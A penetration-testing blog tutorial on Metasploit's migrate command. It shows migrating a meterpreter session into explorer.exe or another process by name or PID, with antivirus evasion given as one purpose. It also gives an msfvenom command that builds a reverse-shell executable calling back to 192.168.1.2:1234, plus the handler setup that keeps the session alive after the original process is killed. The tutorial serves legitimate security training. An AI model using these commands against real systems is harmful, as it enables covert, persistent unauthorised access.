<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Metasploit for Pentester: Migrate</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/metasploit-for-pentester-migrate/" rel="bookmark"><time class="entry-date published" datetime="2021-07-30T11:17:01+00:00">July 30, 2021</time><time class="updated" datetime="2025-05-12T21:17:35+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In the continuation in this series of articles dedicated to the Metasploit Framework to provide an appropriate resource for Penetration Testers so that they can use the variety of the features present in the Metasploit Framework to the maximum extent. In this article, we will be talking about the migrate command and its functionalities.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Introduction</strong></span></li>
<li><span style="color: #000000;"><strong>Migration with Process Name</strong></span></li>
<li><span style="color: #000000;"><strong>Migration with Process ID</strong></span></li>
<li><span style="color: #000000;"><strong>Generating Prepend Migrate Payload</strong></span></li>
<li><span style="color: #000000;"><strong>Persistence with Prepend Migrate</strong></span></li>
<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
</ul>
<h3><span style="color: #800000;"><strong>Introduction</strong></span></h3>
<p><span style="color: #000000;">Before jumping right into the <strong data-start="334" data-end="353">migrate command</strong> and its options, we must first state that <strong data-start="396" data-end="407">migrate</strong> acts as a <strong data-start="418" data-end="439">post-exploitation</strong> module. It can be used only after successfully exploiting a machine. In the demonstration provided, we exploited a <strong data-start="555" data-end="574">Windows Machine</strong> and then used the <strong data-start="593" data-end="612">migrate command</strong> on the processes running on that machine. Once we successfully exploited the machine and achieved a <strong data-start="713" data-end="736">Meterpreter session</strong>, we used the <strong data-start="750" data-end="769">Migrate command</strong> to transfer the process where the exploit was running to a different process.</span></p>
<h5><span style="color: #000000;"><strong>The reason for migrating from one process to another can be stated below.</strong></span></h5>
<ol>
<li><span style="color: #000000;"> <strong data-start="931" data-end="944">Stability</strong>: Exploits and Payloads that provide the session often remain unstable compared to basic processes developed for the target. Consequently, migrating to stable processes provides a more reliable connection.</span></li>
<li><span style="color: #000000;"> <strong data-start="1152" data-end="1164">Cloaking</strong>: Antivirus Software or other Defensive Software often scans for malicious files. Therefore, Cloaking or Hiding the malicious process helps avoid detection.</span></li>
<li><span style="color: #000000;"> <strong data-start="1323" data-end="1340">Compatibility</strong>: During exploitation, it is possible that the payload was designed for a 64-bit Architecture, while the session obtained belongs to an Operating System running on 86-bit Architecture. Thus, the <strong data-start="1535" data-end="1554">Migrate command</strong> helps shift the process to a native environment and ensures compatibility.</span></li>
</ol>
<p><span style="color: #000000;">Now that we have a basic understanding of the <strong data-start="1682" data-end="1701">migrate command</strong> and the situations where migration proves useful, let’s explore the command options. To understand the various options, we can run <strong data-start="1833" data-end="1844">migrate</strong> with the</span> -h<span style="color: #000000;"> option and view the help section, as shown in the image. In the help menu, we find the choice to provide the PID of the process we want to migrate, use the <code data-start="2015" data-end="2019">-P</code> option for the target PID,</span> -N<span style="color: #000000;"> to specify the Name of the process, and</span> -t<span style="color: #000000;"> for setting the timeout.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">migrate -h</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QByVeBEEPXk/YQPb9XVzmwI/AAAAAAAAyBg/_aY4FjZOp_QEDg9q65YxlIv4To2vKCt5gCLcBGAsYHQ/s16000/1.png"/></span></p>
<h3><span style="color: #800000;">Migration with Process Name</span></h3>
<p class="" data-start="326" data-end="608"><span style="color: #000000;">We will begin with the <strong data-start="349" data-end="362">Migration</strong> based on the <strong data-start="376" data-end="399">Name of the process</strong>. Usually, users apply <strong data-start="422" data-end="433">migrate</strong> in collaboration with the <strong data-start="460" data-end="474">Process ID</strong>. However, as we deduced from the Help section, an option is available that assists with migration using the <strong data-start="583" data-end="606">name of the process</strong>.</span></p>
<p class="" data-start="610" data-end="963"><span style="color: #000000;">To demonstrate this, we will migrate the <strong data-start="651" data-end="662">payload</strong> that we used to get the session on the target machine into the</span> Explorer.exe<span style="color: #000000;"> process. We observe that the <strong data-start="770" data-end="789">payload raj.exe</strong> is currently running on the machine with the <strong data-start="835" data-end="849">Process ID</strong> of 7088. Keep this in mind because, when we migrate it, we can verify the successful migration based on this PID.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SufgBpfJ4EQ/YQPcCXnU3MI/AAAAAAAAyBk/9TrK19ZwsQAMyHmrvF8GbljEVEIxa8YjgCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">We already know that the <strong data-start="2153" data-end="2173">Explorer Process</strong> runs by default on <strong data-start="2193" data-end="2219">Windows-based machines</strong> and manages the Display Management, Taskbar, and Start Menu. As a result, this process runs until the machine powers off. This characteristic makes Explorer an ideal candidate for migrating the <strong data-start="2414" data-end="2425">payload</strong>. We run the <strong data-start="2438" data-end="2457">migrate command</strong> with the</span> -N<span style="color: #000000;"> option followed by the process name. Subsequently, we observe in the image that the <strong data-start="2556" data-end="2575">payload process</strong></span> raj.exe<span style="color: #000000;"> with PID 7088 successfully migrated to the <strong data-start="2629" data-end="2649">Explorer Process</strong> with PID 5200.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">migrate -N explorer.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u1QBoPGXW5g/YQPcGgmHj2I/AAAAAAAAyBo/8MmGvh-Y6W8AzOkqFjp_RzXVqwbAAsuqQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">To perform a quick check on our <strong data-start="2703" data-end="2722">payload process</strong>, we again run the</span> ps<span style="color: #000000;"> command with</span> grep<span style="color: #000000;"> to search for a process named</span> raj.exe.<span style="color: #000000;"> However, we observe that the process was not found because it migrated successfully to the Explorer process.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ps | grep raj.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y0I2ekrfJKM/YQPcLpM6U0I/AAAAAAAAyBs/Gpda5FtO6sAizd-geyVsg_FFdJzXeUOZwCLcBGAsYHQ/s16000/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>Migration with Process ID</strong></span></h3>
<p><span style="color: #000000;">Moving onto the demonstration of the method that most of the Penetration Testes are familiar with. As they have used the migrate in to perform the migration of a process using the PID. To demonstrate, we will take the notepad process running on the target machine with the PID 3556. This is just a random example, the method can be applied to any of the processes or even the payload process as shown earlier.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9QR-wfimTrU/YQPcQC5OjYI/AAAAAAAAyBw/VeuFENE1YLQW93N6p-aOveAPCRuz1O7aQCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Now, again we can check the process that we are targeting with the help of the ps command. This process can be streamlined with the help of grep as it will show the process of interest. We see that we have the process with the PID 3556. We will use the migrate command and followed by the process ID of the targeted process. And we can see that the process was successfully migrated.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ps | grep notepad
migrate 3556</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DwU_q3G3P1c/YQPcVJrfscI/AAAAAAAAyB4/15gZPbFyrVMvhTWzeKSItKzZKzNryxnIwCLcBGAsYHQ/s16000/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Generating Prepend Migrate Payload</strong></span></h3>
<p><span style="color: #000000;">Earlier we talked about how the Explorer process is the ideal process for migrating the payload process. We can arrange this while creating the payload itself with the help of msfvenom. This will create the payload of your choice with the prependmigrate option. From the image and the command provided below, we can see that we are creating a payload targeting the Windows machine and generating a reverse shell back to the IP Address 192.168.1.2 and port 1234. But we also provide that the malicious process should migrate to the Explorer process. At last, we are stating that this payload should be generated into an executable file for the target to run.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=1234 prependmigrateprocess=explorer.exe prependmigrate=true -f exe &gt; shell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N4JKWwlIkMk/YQPcaCr-5_I/AAAAAAAAyCA/79LmjCJQc1kt52eZlKj9a-E0KqFYs3HBACLcBGAsYHQ/s16000/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Persistence with Prepend Migrate</strong></span></h3>
<p><span style="color: #000000;">Finally, we are going to migrate the malicious process to a safe already running process, and then we will try to kill the process to see if it is possible to create a Persistence with this type of migration. This will help us with the life of the session that we have generated. Suppose that target, can be the user or any protection software suspects that there is a malicious process present on the machine, it can try to terminate the particular process. </span></p>
<p><span style="color: #000000;">If we migrate the <strong data-start="2940" data-end="2951">process</strong>, we can retain the session and maintain the access we require. Using the <strong data-start="3025" data-end="3036">payload</strong> we previously generated with MSFVenom, we gained a session on the target machine. Additionally, we required a listener to capture the <strong data-start="3171" data-end="3188">reverse shell</strong> generated from the payload’s execution on the machine. We set all the parameters configured during payload creation. As soon as we established a session, we noticed that the shell process was created with PID 8064. We tried killing the process, and even after termination, the session remained active. This demonstrated a persistent <strong data-start="3522" data-end="3537">meterpreter</strong> session on the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
set lport 1234
set prependmigrateprocess explorer.exe
set prependmigrate true
exploit
ps | grep shell.exe
kill 8064
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WuYVar5cuC8/YQPce-lb9eI/AAAAAAAAyCI/wAwO0Kfh9sswHCPCwGXEbMcptUwZfIs7wCLcBGAsYHQ/s16000/9.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">To conclude, we would like to point out that Metasploit is full of various small utilities that any Penetration Tester could use during their assessment. However, the depth of the different tasks that these utilities can perform is much more than what we use them for. Hence, we wrote this article to introduce the workings of the migrate command from the Metasploit Framework.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
